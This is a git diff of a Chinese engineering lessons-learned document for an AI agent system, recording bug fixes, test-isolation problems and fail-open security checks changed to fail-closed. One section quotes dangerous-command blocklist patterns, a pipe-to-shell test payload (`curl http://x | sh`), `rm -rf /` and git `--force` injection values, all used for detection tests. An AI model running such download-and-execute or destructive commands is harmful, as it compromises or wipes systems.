@@ -441,28 +441,7 @@ API Key 明存 localStorage → 改内存；静默 catch → 各调用处加错�
 1. **任何"开关/设置"必须真正接入消费方**——只读显示不接判定 = 摆设。加设置时先查谁消费它、判定路径是否引用。
 2. **前端可改配置项必须进 `_MODIFIABLE_FIELDS`**——否则 PUT /config/{key} 报 FORBIDDEN（403），用户点了没反应。
 3. **三层配置（全局/默认/覆盖）明确优先级**，消费方用同一套解析（`会话配置 if cfg else 全局默认`），避免"配了不生效"困惑。
-4. 设置入口与功能页合并（如主动搭话页并入设置）后，侧栏入口要同步移除，避免两处入口、一处失效。## 21. 主动搭话旁路绕过全局/会话开关（后端）+ 测试污染生产库
-
-**现象：** 用户在设置页关闭「主动搭话」全局开关后，感知到屏幕高强度变化/定时任务到点时**仍然收到主动消息**；同时生产库 `data/memory.db` 积累大量 `test_xxx` 前缀的「你好」测试会话。
-
-**根因（两层）：**
-1. **旁路绕过三层闸门**：§18 只修了主路径 `ProactiveTrigger._get_enabled_outreach_sessions()`（全局开关 → 会话 enabled → 规则），但另两条触发源完全绕过：
-   - `trigger_think.py`（感知触发思考）：只有自己的冷却+强度阈值，**不检查** `PROACTIVE_OUTREACH_ENABLED`，也不检查任何会话是否开启主动搭话——全局关闭后仍广播 proactive 消息；
-   - `scheduled_tasks.py::_handle_chat`（定时任务）：只查任务 enabled，**不检查**全局总开关。
-2. **测试写生产库**：`tests/unit/test_conversation_memory.py::test_session_context_accumulation` 直接用全局单例 `get_thinking_system()` + 随机 `test_{hex}` 会话 id → `system.start()` 落库到真实 `data/memory.db`，每次跑测试新增一个「你好」会话。
-
-**修复：**
-1. 新增模块级三层闸门函数 `modules/perception/trigger.py::outreach_trigger_allowed()`——全局开关关闭或无任何会话开启主动搭话时返回 False；`trigger_think._trigger` 入口接入（第 1、2 层），`scheduled_tasks._handle_chat` 接入全局开关检查。第 3 层（规则标准）仍由各触发源判定。
-2. 测试改用临时 SQLite（monkeypatch `sqlite_path` + 独立 `StreamThinkingSystem` + 固定会话 id），绝不触碰生产库；已清理生产库残留 `test_*` 会话（备份 `data/memory.db.bak_pre_test_cleanup`）。
-
-**验证：** 新增单测覆盖「全局关不触发」「无会话开启不触发」；端到端 7 项闸门断言全过；相关测试 71 项通过。
-
-**经验：**
-1. **修开关类 bug 要枚举所有触发源**——主路径修好但旁路（感知触发/定时任务）仍绕过 = 用户依旧觉得"开关是摆设"。§18 的三层闸门语义应作为所有主动消息的统一前置。
-2. **测试必须隔离生产库**——凡调用 `get_thinking_system()`/`get_session_repo()` 全局单例的测试，都必须先 monkeypatch `sqlite_path` 指向临时库；用完随机 `test_` 前缀会话 id 的测试，本身就是污染源。
-
-
-
+4. 设置入口与功能页合并（如主动搭话页并入设置）后，侧栏入口要同步移除，避免两处入口、一处失效。
 ## 19. 自动化替换留下的运行时 NameError + 同名索引重复（后端）
 
 ### 19.1 自动化替换未定义 helper → 运行时 NameError
@@ -514,6 +493,27 @@ API Key 明存 localStorage → 改内存；静默 catch → 各调用处加错�
 1. **测试输入必须用真实生产模型构造**（或用与其完全一致的字段集），不要自定义"看起来合理"的假类——假对象字段与真实模型不一致时，测试通过但真实运行暴露的恰恰是字段差异。
 2. **消费生产数据对象的代码，测试要断言"输出内容质量"**，而不只是"被调用了"——`getattr(x, 'field', default)` 取到默认空值导致内容空洞，只有断言内容才能抓住。
 3. 给测试写 fixture 前，先 `grep` 生产模型定义确认字段名，别凭感觉。
+
+
+## 21. 主动搭话旁路绕过全局/会话开关（后端）+ 测试污染生产库
+
+**现象：** 用户在设置页关闭「主动搭话」全局开关后，感知到屏幕高强度变化/定时任务到点时**仍然收到主动消息**；同时生产库 `data/memory.db` 积累大量 `test_xxx` 前缀的「你好」测试会话。
+
+**根因（两层）：**
+1. **旁路绕过三层闸门**：§18 只修了主路径 `ProactiveTrigger._get_enabled_outreach_sessions()`（全局开关 → 会话 enabled → 规则），但另两条触发源完全绕过：
+   - `trigger_think.py`（感知触发思考）：只有自己的冷却+强度阈值，**不检查** `PROACTIVE_OUTREACH_ENABLED`，也不检查任何会话是否开启主动搭话——全局关闭后仍广播 proactive 消息；
+   - `scheduled_tasks.py::_handle_chat`（定时任务）：只查任务 enabled，**不检查**全局总开关。
+2. **测试写生产库**：`tests/unit/test_conversation_memory.py::test_session_context_accumulation` 直接用全局单例 `get_thinking_system()` + 随机 `test_{hex}` 会话 id → `system.start()` 落库到真实 `data/memory.db`，每次跑测试新增一个「你好」会话。
+
+**修复：**
+1. 新增模块级三层闸门函数 `modules/perception/trigger.py::outreach_trigger_allowed()`——全局开关关闭或无任何会话开启主动搭话时返回 False；`trigger_think._trigger` 入口接入（第 1、2 层），`scheduled_tasks._handle_chat` 接入全局开关检查。第 3 层（规则标准）仍由各触发源判定。
+2. 测试改用临时 SQLite（monkeypatch `sqlite_path` + 独立 `StreamThinkingSystem` + 固定会话 id），绝不触碰生产库；已清理生产库残留 `test_*` 会话（备份 `data/memory.db.bak_pre_test_cleanup`）。
+
+**验证：** 新增单测覆盖「全局关不触发」「无会话开启不触发」；端到端 7 项闸门断言全过；相关测试 71 项通过。
+
+**经验：**
+1. **修开关类 bug 要枚举所有触发源**——主路径修好但旁路（感知触发/定时任务）仍绕过 = 用户依旧觉得"开关是摆设"。§18 的三层闸门语义应作为所有主动消息的统一前置。
+2. **测试必须隔离生产库**——凡调用 `get_thinking_system()`/`get_session_repo()` 全局单例的测试，都必须先 monkeypatch `sqlite_path` 指向临时库；用完随机 `test_` 前缀会话 id 的测试，本身就是污染源。
 
 
 ## 22. 全按钮审计方法论 + 启动快捷键 shortcut_keys 是摆设（前端/后端）
@@ -647,6 +647,8 @@ API Key 明存 localStorage → 改内存；静默 catch → 各调用处加错�
 
 **修复：**
 1. 三个客户端 `generate()` 新增 `system_prompt: str = None` 参数——**非空时覆盖**自动人设，默认行为不变（向后兼容）；
+   > **后续变更（§27.8 前）：** `generate()` 的 `system_prompt` 已改为 **keyword-only 必填**——缺失直接
+   > `TypeError`，不再注入任何默认 agent 人设（详见 docs 后续 §27.8 config/providers 接线）。
 2. 各工具调用方传入专用精简 system prompt（各自"只做 X、不执行工具、只输出指定格式"）：
    - `event_reducer` → `MEMORY_REDUCE_SYSTEM_PROMPT`（记忆收纳）
    - `context_slicer` → 摘要助手专用（对话摘要）
@@ -664,3 +666,439 @@ API Key 明存 localStorage → 改内存；静默 catch → 各调用处加错�
 1. **"模型客户端通用方法"的人设默认值，只应服务主对话流**——凡把通用 `generate()` 当"单次 LLM 调用"用的工具任务，都必须显式传自己的 system prompt，否则会继承无关 agent 人设（身份冲突 + 浪费 token）；
 2. **给通用方法加新参数时，先 grep 所有 mock/调用方**——测试里的替身类 mock 常因签名不兼容直接抛 `unexpected keyword argument`；
 3. **断言"输出内容质量"比断言"被调用"更能抓 prompt 类问题**——§20 同款经验。
+
+
+## 26. 聊天附件"发不出去"：三个契约断裂连环 + 测试基建缺失（前端/后端）
+
+**现象：** 前端聊天框上传图片后，AI 看不到图片内容；甚至只带图片不带文字时消息根本发不出去。
+
+**根因（三个独立 bug 连环，任一环断裂图片就失效）：**
+
+1. **前端只发裸 dataURL 字符串（载荷形状错）** `frontend/src/components/ChatInput.vue`
+   `handleSend` 发送 `attachments.value.map(a => a.data)`——把 `{type,name,data}` 对象拆成**裸 base64 字符串数组**。后端 `parse_attachments` 用 `if not isinstance(att, dict): continue` 跳过所有非字典项 → 图片被**静默丢弃**，用户看到"发出去了"实际为空。
+2. **附件 type 存的是内部类别而非 MIME** `ChatInput.vue` `handleFiles`
+   附件对象 `type` 写死为 `isImage ? 'image' : 'file'`（内部类别）。后端用 `atype.startswith("image/")` 判断是否走视觉——`'image'` 不匹配 `"image/"` → 图片被当普通文件，只标注文件名、**不走视觉分析**。
+3. **视觉 API URL 双重 `/chat/completions` → 404** `infra/data_process/core/image_analyzer.py`
+   `_analyze_openai` 把 `VISION_API_URL`（含 `/chat/completions`）直接当 `base_url` 传给 openai SDK，SDK 再拼一次路径 → 请求打到 `.../chat/completions/chat/completions` → 404 → 图片解析失败降级为文本。`config/providers/openai.py:76-78` 有去重处理，`ImageAnalyzer` 没有。
+
+**为什么测试没抓到：**
+- 后端单测 `test_attachment_handler.py` 只**直接调用 `parse_attachments`**，且传的是结构正确的字典——它验证"后端函数在正确输入下工作"，但从不验证"前端实际发送的载荷形状"；
+- 前端**完全没有测试基建**（package.json 无 test 脚本、无 vitest/jest、零 spec 文件），唯一校验 `npm run build` 只查语法/引用，查不出载荷形状错误；
+- 后端 WS input 无 schema 校验——`chat_gateway.py`/`api_stream.py` 都是 `json.loads` + `.get()` 直接取字段，前端发错形状**静默跳过不报错**。
+
+**修复：**
+1. `ChatInput.vue`：发送载荷改为完整 `{type, name, data}` 字典数组；**允许仅图片（无文字）发送**（原 `if (!text) return` 拦截）。
+2. `ChatInput.vue`：附件 `type` 存真实 MIME（`file.type`），预览判断改 `startsWith('image/')`。
+3. `image_analyzer.py`：`_analyze_openai` 与 `_detect_ui_openai` 对 base_url 归一化（去尾部 `/chat/completions`），与 `config/providers/openai.py` 保持一致。
+4. **后端契约校验**：`attachment_handler.py` 新增 `ChatAttachment` 模型 + `validate_attachments()`，`chat_gateway.py`/`api_stream.py` 的 WS input 解析前先校验，非法形状返回明确错误事件，不再静默吞掉。
+5. **前端测试基建**：引入 vitest + @vue/test-utils + jsdom，`npm test`；`ChatInput.spec.js` 5 用例固定发送载荷形状（含两条历史 bug 回归）。
+6. **后端契约测试**：`tests/unit/test_attachment_contract.py` 11 用例覆盖裸字符串数组、缺 data、坏元素整体拒绝、校验通过即可解析。
+
+**验证：** 后端 52 项相关测试通过（attachment + contract + api_stream + ws_client）、chat_light 系列 32 项通过；前端 5 项测试通过、`vite build` 通过。
+
+**同类排查：** 附件发送方仅 Vue 前端（旧版 `frontend/js` 已删、无独立 `backend/` 包）；生产 WS 附件入口仅 `chat_gateway.py` + `api_stream.py` 两处，均已加校验；URL 双重路径模式抓到并修复了 `_detect_ui_openai`（当时为 DeepSeek 地址未触发，属潜伏同类 bug）。
+
+**经验：**
+1. **"后端函数在正确输入下工作"≠"整条链路通"**——前后端契约（载荷形状/字段名/枚举值）必须有一方做显式校验，否则发错形状只会静默丢数据；
+2. **测试要覆盖"真实载荷形状"，不只测"函数被正确调用"**——前端无测试基建本身就是隐患，任何"前端发什么、后端期望什么"的边界都应写单测固定契约；
+3. **传给 OpenAI SDK 的 base_url 必须归一化**——凡是配置里可能带 `/chat/completions` 的地址，传 SDK 前先去重，否则双重路径 404 且错误极难定位；
+4. **内部类别名（image/file）≠ 协议类型（image/png）**——用 `startsWith`/枚举匹配的字段，数据源必须存"协议认可的值"而非"界面展示类别"。
+
+
+## 27. macOS 双 libomp 段错误/abort + 测试与生产环境审查（后端/环境）
+
+**现象：** 组合运行 `test_chat_light_* + test_conscience` 时进程崩溃：
+- 首次 `OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized` → `Fatal Python error: Aborted`（exit 134）
+- 设 `KMP_DUPLICATE_LIB_OK=TRUE` 后变为 `Segmentation fault`（exit 139），崩溃点随机（torch import / BERT forward）
+- 单独跑 `test_conscience`（12 项）或 `test_chat_light_*`（34 项）都通过，只有组合才崩——flaky、时序相关
+
+**根因（两层，实证排查）：**
+1. **双 OpenMP 运行时（真根因）**：`otool -L` 证实 `faiss/_swigfaiss.abi3.so` 与 `torch/lib/libtorch_cpu.dylib` 各依赖**自己的** `libomp.dylib`（`@loader_path/.dylibs/libomp.dylib` vs `torch/lib/libomp.dylib`）。同一进程两套 OpenMP，第二个初始化时 abort（OMP: Error #15）；用 `KMP_DUPLICATE_LIB_OK` 容忍后，两套 OpenMP 的线程池在运行时冲突 → 随机段错误。
+2. **曾被误判的并发竞态**：崩溃栈里出现 `event_store.py:268 _worker` 后台线程，一度怀疑是 worker 与主线程并发加载/推理 torch 导致。为此加了 `EmbeddingEngine._load_lock`/`_infer_lock`、测试关 worker——**均无效**。用最小脚本 `faiss→torch` / `torch→faiss` 复现均正常，说明双 libomp 本身不必然崩，崩溃是"两套 OpenMP + 既有线程状态"的时序问题。**教训：段错误排查先做最小复现+二分组合，别急着改业务代码。**
+
+**根因修复：** `scripts/fix_macos_libomp.py` 用 `install_name_tool -change` 把 faiss 二进制的 `@loader_path/.dylibs/libomp.dylib` 改为 torch 的 libomp **绝对路径**，dyld 按规范化路径去重 → 进程只剩**单一 OpenMP 运行时**；`codesign --force --sign -` 重新签名。
+- `KMP_DUPLICATE_LIB_OK` 从"修复"降级为"兜底"（未跑脚本的环境避免 abort，但不保证稳定）
+- 升级 faiss/torch 后需重跑脚本（`--check` 检测、`--restore` 恢复）
+
+**验证：** 组合 46 项全过；**不设 KMP_DUPLICATE_LIB_OK** 时 `faiss + torch + BERT 推理`正常（证明已单一 OpenMP）；连续 3 次组合测试稳定通过。
+
+**经验：**
+1. **"多实例动态库"（OMP/OpenSSL/其他）不能靠 env 容忍当修复**——`KMP_DUPLICATE_LIB_OK` 官方标注 "unsafe, unsupported"：只消除初始化 abort，运行期仍随机段错误。根因是合并到单一实例（install_name_tool 指向同一绝对路径）。
+2. **环境级修复必须写成可重复脚本**（升级依赖后失效）+ 兜底 env + 文档，否则换机/升级即复发。
+3. **排查原生崩溃：先最小复现 + 二分测试组合**，用 faulthandler 抓线程栈，区分"必然崩溃"与"时序 flaky"。
+
+### 27.1 测试与真实生产环境不一致（审查清单）
+
+| 项 | 现状 | 处置 |
+|---|---|---|
+| `test_conscience.py` clean_state | 曾回退到生产 `data/events_faiss_<USER>.index`（fixture 只传 db_path） | **已修**：faiss/id_map 一并指临时目录 + 重置 `EventRetrieval._instance` |
+| `test_trigger_think.py` `_Diff` | 假对象带生产不存在的 `description` 字段（§20 警告模式）；旧测试只断言触发数量 | **已修**：`_Diff` 改真实字段（category+payload），内容断言由 §20 新增测试覆盖 |
+| `test_chat_light_thinker.py` | mem_store 用 hashlib 假 embed（生产 torch BERT 384 维）——确定性测试合理，真实 embed 由 `test_memory_search.py` 覆盖 | 合理，保留 |
+| `EMBEDDING_BACKGROUND_WORKER` | 测试关、生产开 | 合理差异（测试不需要后台向量化），conftest 注释说明 |
+| `generate()` 各客户端 | 测试 mock 签名与生产不兼容时抛 TypeError（§25） | 已统一 + mock 同步 |
+
+### 27.2 表层修复审查（重点提醒）
+
+- **`KMP_DUPLICATE_LIB_OK=TRUE`（settings.py / conftest.py）**——最典型的表层修复，已升级为根因合并脚本。
+- **`except Exception: pass` 全库 193 处**——多数合理（ImportError 探测/后台清理/降级），但这是"错误被吞、真问题被掩盖"的高发区。改动前先确认吞错是否可接受、是否该记日志。
+- **`test_write_final_result_supervisor/expert`** 原只 `assert_called_once()`，已补强断言写入内容（§26 同类经验）。
+
+### 27.3 真实核心路径零测试覆盖（§19 教训再验证）
+
+排查发现 `infra/data_process/core/image_analyzer.py` 的真实视觉方法
+（`_detect_available_model` / `_analyze_openai` / `_analyze_mlx_vlm` / `_analyze_qwen_vl`）
+**零测试覆盖**——`test_screen_monitor_and_vision.py` / `test_ui_interactor.py` 全部用
+monkeypatch 的 analyzer 替身，真实视觉代码（含 §26 修的 base_url 归一化、VISION_BACKEND
+检测、deepseek/openai 消息格式）没有任何回归保护。这正是 §19"mock 掩盖真实实现"的教训。
+
+**修复：** 新增 `tests/unit/test_image_analyzer.py`（8 项）：
+- `_detect_available_model`：api 无 key → unavailable / api 有 key → openai / 未知后端容错回退
+- `_analyze_openai` base_url 归一化（`/chat/completions` 去重，§26 回归）+ 普通 URL 保留
+- deepseek base64 内联 vs openai image_url 两种消息格式
+- `analyze()` 后端不可用时降级返回
+
+**经验：** 排查测试缺口时，专门找"测试里全部用 mock/patch 替身、真实实现零引用"的模块——
+这类模块的真实路径任何回归都无保护，是§19/§20 事故的高发区。
+
+### 27.4 生产代码 fail-open 修复 + 测试 mock 掩盖清单（全量审查）
+
+**生产代码 fail-open（安全高危，已修）：** `modules/security_system/tool_security_gate.py` 两处
+安全校验异常被 `except Exception: pass` 静默吞掉 → **fail-open**（权限系统/安全拦截出错时工具被放行绕过安全门控）：
+- 角色类别权限检查异常（原 :254 静默 pass）→ 改为 fail-closed：log + 审计 + 拒绝
+- 写操作安全拦截检查异常（原 :281 静默放行）→ 改为 fail-closed：log + 审计 + 拒绝
+
+**修复验证：** 新增 `TestFailClosedOnCheckExceptions`（2 项）——mock 权限检查抛异常、安全拦截检查抛异常，
+均断言 `check()` 返回拒绝。安全校验必须 fail-closed 是铁律，任何"校验出错继续放行"都是高危表层修复。
+
+**测试 mock 掩盖真实核心路径清单（explore 全量扫描）：**
+
+| 生产符号 | 被 mock 掩盖 | 真实覆盖 |
+|---|---|---|
+| `trigger_think._run/_has_active_connections/_think` | test_trigger_think.py 全 patch | **无**（仅 external） |
+| `ToolSecurityGate._check_user_review/resolve_review` | test_toolgate:166-280、test_control_mode:57-80 共 7 处 | **无** |
+| `ModelRunnerManager` 整类 | 仅 get_runner_manager 被替换 | **无（零引用）** |
+| `MultiModelOrchestrator._execute_multi_model_thinking` | 全依赖 mock | **无** |
+| `ContinuousThinker` 类 | model_runner_core:269,299,330 替换为假类 | 部分（__init__ 等） |
+| `ModelRunner` 14 方法 | 无引用 | **无** |
+| `ImageAnalyzer` 本地 VLM+UI 16 方法 | 4 个测试文件替换为假对象 | 部分（§27.3 补 API 分支） |
+| `management/api.py` 41 端点 | — | 零覆盖 |
+
+**经验：** 排查"测试与生产不一致"时，两类最有价值：
+1. **安全/权限代码的静默吞错 → fail-open**（比功能 bug 严重得多）——凡安全校验的 `except: pass` 都必须 fail-closed；
+2. **测试全 mock 真实实现导致真实核心路径零覆盖**——trigger_think 真实链路、审批 future 回填、
+   runner 编排、orchestrator 全链路等仍是回归盲区，优先级高的应逐步补真实测试。
+
+### 27.5 继续修复：真实审批路径测试 + 权限控制器 fail-open（续）
+
+接 §27.4 的 mock 掩盖清单，本轮补上真实实现测试并再修一处 fail-open：
+
+**1. `ToolSecurityGate._check_user_review` 真实实现测试（4 项，test_toolgate.py）**
+原审批核心路径（future 等待 + `resolve_review` 回填 + 防重叠 + `Suspension` 全局挂起/恢复）7 处全被 patch。
+新增真实测试：批准流（resolve True → 返回"用户批准"）、拒绝流、防重叠（同工具二次请求返回等待、
+不新增审批）、未知 request_id 不报错；每个测试断言 `Suspension` 挂起被 finally 恢复。
+
+**2. `trigger_think._think` 真实 prompt 链路测试（2 项，test_trigger_think.py）**
+原 `_run/_think` 全被 `_fake_run` 掩盖。新增测试走真实 `_think`：mock 边界（`generate_and_push`/`call_outreach_llm`），
+断言传给 LLM 的 prompt **真实包含差异描述**（防 §20 desc 空转回归）、消息类型/事件正确、空 desc 不崩溃。
+
+**3. `tool_permission_controller._get_caller_permissions` fail-open → fail-closed（高危）**
+`check_execution_permission` 对 `permissions is None` 放行；而 `_get_caller_permissions` 外层
+`except Exception: pass → return None` 把权限查询异常静默变成 None → **权限系统故障时所有工具绕过类别校验**。
+修复：外层异常改为 log + 返回 `ModelPermissions(allowed_tool_categories=[])`（空权限 → 拒绝全部），
+"正常未找到"仍返回 None（保持控制工具默认允许语义）。内层 YAML 解析异常改 log 留痕。
+新增 2 项测试：model_factory 抛异常 → `check_execution_permission("git_add")` 拒绝；控制工具保持默认允许。
+
+**验证：** test_toolgate 74 项、权限相关（control_mode/tool_visibility/tool_permission/probe_permission）
+128+17 项全过；image_analyzer/trigger_think/conscience 等 156 项通过。
+
+### 27.6 假测试排查（续）：名不副实 + 无断言 + flaky 超时
+
+按"假测试"模式全量扫描测试替身与断言质量：
+
+**已修复的名不副实/无断言测试：**
+1. `test_build_system_prompt_contains_role`（core_continuous_thinker）——名字要求断言 role 但只
+   `try/except pass` 吞错；且调用 `_build_prompt("用户输入", "初始问题")` 把 round_num 传成字符串。
+   改为 `test_build_prompt_contains_question`：真实构建并断言 prompt 含初始问题。
+   **顺带发现**：`_build_prompt` 输出只有【当前任务】段，role 人设由 system prompt 负责（与文档
+   line 601 注释一致）——测试名原本就误导。
+2. `test_rebuild_faiss_dim_same/mismatch`（embedding）——无断言，补：同维度不重建（os.remove 未调用）、
+   异维度触发重建。
+3. `test_emit_streaming_content`（model_runner_core）——收集了广播消息却不断言，补：消息真实携带
+   `entry_type="streaming_delta"`/增量内容/tier/round。
+
+**核查为合理（非假测试）的替身**：FakeEvent/FakeChain（覆盖被消费字段）、FakeThinker/FakeBlackboard/
+FakeRepo（backend 精简版内存替身）、FakeClient/FakeMCP（真实接口）、FakeObs（显式对齐真实模型字段）、
+FakeGtts（外部库替身）、_FakeValueSystem（接口与真实一致，仅注释"未实现"过时）、_FakeRepo（消费最小接口）。
+
+**flaky 根因修复：** `test_image_analyzer.py` 偶发超时——`_detect_available_model` 真实执行
+`from mlx_vlm import ...` → 触发 transformers 重库 import，组合跑时超过 pytest 全局 `--timeout=10`。
+加模块级 `pytestmark = pytest.mark.timeout(60)`（与 conscience 同款）。连续 5 次组合跑稳定通过。
+
+**经验：** 排查"假测试"三条线索——① 名字暗示行为期望但函数体无断言/只吞错；② 断言只查
+"被调用/不抛异常"不查内容；③ 会 import 重库的测试受全局 10s timeout 影响出现顺序相关 flaky，
+需按需放宽 timeout。
+
+### 27.7 pass 排查 + 非确定性测试审查
+
+**测试中 pass 语句全量核查（37 处）**：35 处合理——mock 占位（`async def accept: pass`/`__aexit__`/`close`）、
+异常类定义（`class X(Exception): pass`）、teardown 清理、ImportError 依赖探测。**2 处是假测试，已修：**
+
+1. **`test_context_slicer.py::test_slice_for_large_basic`（假测试，掩盖真实 bug）**——
+   `try: slice_for_large("用户输入", {}, {}, {}, {}) ... except (AttributeError, TypeError): pass`。
+   去掉吞错后暴露：`slice_for_large` 签名早已从多参数改为**单 `CognitiveBlackboard` 参数**，
+   测试一直传 5 个参数触发 TypeError 被静默吞掉、测试空跑假通过。已修为真实 `CognitiveBlackboard`
+   实例 + 断言输出含 goal。**教训：`except (TypeError, AttributeError): pass` 是假测试的高发形态，
+   它会掩盖"生产接口改了、测试没跟上"这类真实回归。**
+2. `test_screen_capture_daemon.py` 一处 `with patch.object(...): pass`（patch 生效期内无操作无断言）
+   无效代码，已删除。
+
+**非确定性测试审查（每次输出可能不同）**：随机数/`set` 遍历为 0；时间相关 55 处均为相对比较
+（冷却/时间窗口），无日期字面量绑定；时序 sleep 测试断言用边界容忍（如 `count >= 1`）而非精确值；
+数组顺序断言 5 处——3 处底层 list 保序、1 处测试自身 `sorted()`、1 处单元素；真实 LLM/API 全部
+mock（无真实调用）；uuid 仅用于生成唯一测试数据不绑定值。**结论：无不合理的非确定性断言。**
+
+### 27.8 config/providers 接线（方案 B）：格式层合并 infra/model
+
+**背景：** `config/providers` 是早期设计的格式适配层（ProviderBase + openai/anthropic/dashscope +
+registry），但生产从未接线（0% 覆盖）——`infra/model` 三个客户端各自内建了重复的格式分支
+（`_api_format` + anthropic/openai/dashscope 三分支），且两套逻辑已分叉：
+`config/providers/openai.py` 的 `chat_url()` 有 `/v1`/`/chat/completions` 归一化，而客户端直接
+`session.post(api_url)` 不做归一化（配 `https://api.openai.com/v1` 会 404，当前靠配置 URL 已含完整端点规避）。
+
+**合并方式（不粗暴替换、不缩减功能）：**
+1. 三个客户端 `__init__` 通过 `get_provider(model, key, url, api_format)` 接线 Provider，
+   统一使用 `provider.build_headers()` / `build_request()` / `chat_url()`（尊重显式 `_api_format`，
+   未显式时按 URL 推断）。
+2. 增强 Provider 以覆盖客户端能力：`OpenAIProvider.parse_response` 增加 `reasoning_content`（thinking 模式）；
+   `ProviderBase.build_request` 接口增加 `top_p`（small 客户端特有参数，openai 生效，anthropic/dashscope 忽略）。
+3. **保留客户端特有逻辑**（不缩减）：large 的 DashScope legacy 文本工具调用解析、流式累积解析
+   （`_parse_openai/_anthropic/_dashscope_stream`）、HTTP/重试/日志/SSL、`reasoning_content` 回退、
+   usage 语义；small/medium 的 `api_messages` 序列化（tool_calls/tool_call_id/reasoning_content 回传）。
+4. 统一 URL：所有请求改走 `self._chat_url = provider.chat_url()`，消除 `/v1` 404 隐患。
+
+**验证：** 新增 `tests/unit/test_providers.py`（17 项：URL 推断/显式格式、三格式 build_request、
+chat_url 归一化、parse_response 含 reasoning_content、stream 单行解析）；模型相关 216 项 +
+全量 unit 1141 项通过（`test_post_format` payload 断言证明接线后请求格式与原来完全一致）。
+
+**教训：** 两套做同一件事的适配层并存必然分叉（格式检测默认值、URL 归一化不一致）。合并方向是
+"格式构造/解析归 Provider、HTTP 骨架与客户端特有逻辑留在客户端"，且必须用 payload 格式测试
+（test_post_format）锁定行为不变。
+
+### 27.9 端到端全绿 + 覆盖补测（utils/agent 工具/流式/记忆链路）
+
+**端到端：** `pytest tests -m "not external and not slow"` → **1569 passed, 0 failed**。
+修复一个全量组合 flaky：`test_causal_graph_comprehensive` 的语义查询触发真实 BERT 加载超
+pytest-timeout 10s（与 conscience 同款），加模块级 `timeout(60)`。
+
+**新增测试（按未覆盖优先级）：**
+- `tests/unit/test_utils.py`（19 项）——time_utils/json_utils/async_utils/exceptions 从 **0% → 全覆盖**
+  （时间转换、JSON 序列化含 datetime、异步并发控制/超时、异常层级与 safe_call/safe_acall）。
+- `tests/unit/test_agent_tools.py`（15 项）——calculator（纯逻辑）、todo（文件持久化 + 会话隔离）、
+  audit_tools（日志 + 审计报告）、tools_search（关键词/类别过滤）。
+- `tests/unit/test_large_model_stream.py`（7 项）——大模型客户端三套流式解析（openai 含
+  reasoning_content/tool_calls 累积、anthropic content blocks、dashscope 累积文本增量）。
+- `tests/unit/test_memory_chain.py`（19 项）——depth_recall 纯逻辑（intent 分类/触发判定/
+  _time_decay/_build_conclusion）+ causal_tree（CausalChain.summary/EvidenceTree.format）。
+- 此前 `tests/unit/test_providers.py`（17 项）——config/providers 格式层（§27.8 接线后）。
+
+**覆盖提升：** config/providers 0%→覆盖、utils 0%→覆盖、agent 工具 8-18%→显著提升、
+large_model_client 13%→含流式、depth_recall/causal_tree 11-12%→纯逻辑覆盖。
+
+### 27.10 继续补测：management/api 端点 + 安全工具（git/exec_command）
+
+**新增测试（全量 1569 → 1602 全绿）：**
+- `tests/unit/test_management_api_ext.py`（14 项）——management/api 零覆盖端点：health_check（healthy/degraded）、
+  root、GCM 已移除的 context 系列、get_thinking_status（healthy/unavailable）、get_security_status、
+  get_sessions/get_runners/get_model_runners（空/带会话）、get_bus_stats、memory 端点（临时 EventStore
+  单例 + 关键词过滤）。注意：直接调端点函数必须显式传 FastAPI Query 默认值（`limit=50` 等）。
+- `tests/unit/test_git_tools.py`（12 项）——_run_git 成功/超时/未安装、git_status porcelain 解析
+  （XY 状态）、git_push 的 `--force` 注入防护（`remote="-"`/`branch="--force"`）、git_diff 增删行统计。
+- `tests/unit/test_exec_command_safety.py`（7 项）——exec_command 极端危险命令硬阻断（rm -rf / 等）、
+  链式命令高危检测。
+
+**顺带修复一个安全缺陷（pipe-to-shell 漏检）：**
+`_DANGEROUS_PATTERNS` 里 `"curl.*|.*sh"`/`"wget.*|.*sh"` 是正则写法，但 `_detect_dangerous_command`
+用子串匹配（`pattern in cmd`），`. *` 当字面量 → **`curl http://x | sh` 这类下载并执行的经典攻击向量漏检**。
+新增 `_DANGEROUS_REGEX`（`curl\s+\S+.*\|\s*(ba|z|k)?sh` 等）用 `re.search` 补漏，测试覆盖通过。
+
+**经验：** 安全检测清单里的正则写法必须用正则引擎执行，否则"看着有检测、实际形同虚设"——写测试时
+要用真实攻击载荷（`curl http://x | sh`）验证能命中，而不是只测子串。
+
+**覆盖提升：** management/api 41 个零覆盖端点大幅缩减、agent 安全工具（git/exec_command）关键路径覆盖、
+exec_command 危险检测纯逻辑全覆盖。
+
+### 27.11 继续补测：web_search / ModelRunnerManager / identity_loader / values_store / causal_tree
+
+**新增测试（全量 1602 → 1657 全绿）：**
+- `test_web_search.py`（14 项）——正则/HTML 解析、内容净化（Markdown/注入/截断）、DDG 搜索（含 202 限流）、
+  fallback 链（ddg_html→lite→sogou→bing→baidu、全部失败）、limit clamp。
+- `test_model_runner_manager.py`（8 项）——ModelRunnerManager 容量限制（max_per_role/max_tier 拒绝）、
+  model_id 唯一后缀、probe_map 注册、stop_runner 清理、全局注册表同 session 复用（此前整类零覆盖）。
+- `test_identity_loader_ext.py`（13 项）——外部 YAML 身份加载（tier 校验/未知字段过滤/文件名推断）、
+  合并（覆盖/新增自动补默认字段）。注意：与 `tests/integration/test_identity_loader.py` basename 冲突，改名 `_ext`。
+- `test_values_store.py`（14 项）——真实 ValueSystem（此前 test_value_formatter 一直用替身）：
+  初始化/读写/分区解析/add/remove/update/cleanup/reset/质量门控/相似度去重。
+- `test_causal_tree.py`（6 项）——CausalTree 溯源（`_trace_to_root` 根因在前）、证据收集按重要性排序、
+  expand_node 完整链路（上下游链 + 证据）。
+
+**顺带修复资源泄漏（真实 bug）：** `ApiLogStore.__init__` 启动后台 `_flush_loop` daemon 线程但
+**没有 stop()**——每个实例一个常驻 `time.sleep(1)` 线程，测试创建多个临时 store 后 pytest 退出卡住
+（INTERNALERROR Timeout，`_flush_loop` 线程残留）。新增 `stop()`（置位 + join + flush + 关连接），
+test_management_api 的 `api_log` fixture teardown 调用。
+
+**经验：** ① 全量跑完退出卡住的排查：先看 pytest INTERNALERROR 的线程栈——常驻 daemon 线程
+（sleep 循环）是典型泄漏源，凡 `__init__` 起线程的类必须提供 `stop()`；② 新测试文件避免与
+已有测试 basename 重复（`test_identity_loader` 撞名导致 collection error）。
+
+**覆盖提升：** web_search（8%）、ModelRunnerManager（0%）、identity_loader（0%）、values_store（0%）、
+causal_tree（12%）关键路径覆盖。
+
+### 27.12 继续补测：tool_discovery / context_budget / management 因果图端点
+
